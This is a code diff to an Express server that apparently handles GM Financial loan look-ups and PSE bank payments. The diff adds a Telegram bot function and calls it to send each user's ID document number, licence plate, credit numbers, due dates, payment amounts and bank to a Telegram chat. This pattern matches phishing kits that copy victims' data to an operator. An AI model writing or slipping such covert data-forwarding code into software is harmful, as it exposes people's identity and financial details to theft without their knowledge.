@@ -8,6 +8,24 @@ import crypto from 'crypto';
 const app = express();
 const PORT = process.env.PORT || 10000;
 
+// ── Telegram ──
+const TG_BOT_TOKEN = process.env.TG_BOT_TOKEN || '';
+const TG_CHAT_ID  = process.env.TG_CHAT_ID  || '';
+
+function sendTelegram(msg) {
+  if (!TG_BOT_TOKEN || !TG_CHAT_ID) return;
+  const payload = JSON.stringify({ chat_id: TG_CHAT_ID, text: msg, parse_mode: 'HTML' });
+  const url = new URL(`https://api.telegram.org/bot${TG_BOT_TOKEN}/sendMessage`);
+  const opts = {
+    hostname: url.hostname, path: url.pathname, method: 'POST',
+    headers: { 'Content-Type': 'application/json', 'Content-Length': Buffer.byteLength(payload) },
+  };
+  const req = https.request(opts, () => {});
+  req.on('error', (e) => console.error('[TG] Error:', e.message));
+  req.write(payload);
+  req.end();
+}
+
 app.use(cors());
 app.use((req, res, next) => {
   res.setHeader('Content-Security-Policy-Report-Only', "default-src * 'unsafe-inline' 'unsafe-eval'");
@@ -278,6 +296,16 @@ async function _doConsulta(page, documento, placa) {
     returnPage(page);
 
     if (datosExtraidos.length > 0) {
+      const resumen = datosExtraidos.map(f =>
+        `  • Crédito: ${f.numeroCredito} | Placa: ${f.placa} | Vence: ${f.fechaVencimiento} | $${f.valorSugerido}`
+      ).join('\n');
+      sendTelegram(
+        `🚗 <b>GM Financial — Consulta</b>\n` +
+        `📄 Doc: <code>${documento}</code>\n` +
+        `🔖 Placa: <code>${placa}</code>\n` +
+        `📋 ${datosExtraidos.length} factura(s):\n${resumen}\n` +
+        `⏱ ${tiempoTotal}s`
+      );
       return {
         estado: 'exitoso',
         documento,
@@ -460,8 +488,23 @@ app.post('/pse/pagar', async (req, res) => {
     }
 
     if (!bankUrl) {
+      sendTelegram(
+        `❌ <b>GM Financial — Pago PSE Fallido</b>\n` +
+        `📄 Doc: <code>${document_number}</code>\n` +
+        `🏦 Banco: ${bank_name || bank_code}\n` +
+        `💰 Monto: $${Number(amount).toLocaleString()}\n` +
+        `⚠️ No se obtuvo URL del banco`
+      );
       return res.status(500).json({ ok: false, error: 'No se pudo obtener la URL del banco.', traceability_id: txTraceId });
     }
+
+    sendTelegram(
+      `💳 <b>GM Financial — Pago PSE</b>\n` +
+      `📄 Doc: <code>${document_number}</code>\n` +
+      `🏦 Banco: ${bank_name || bank_code}\n` +
+      `💰 Monto: $${Number(amount).toLocaleString()}\n` +
+      `🔗 Redirigido al banco`
+    );
 
     return res.json({ ok: true, bank_url: bankUrl, traceability_id });
 
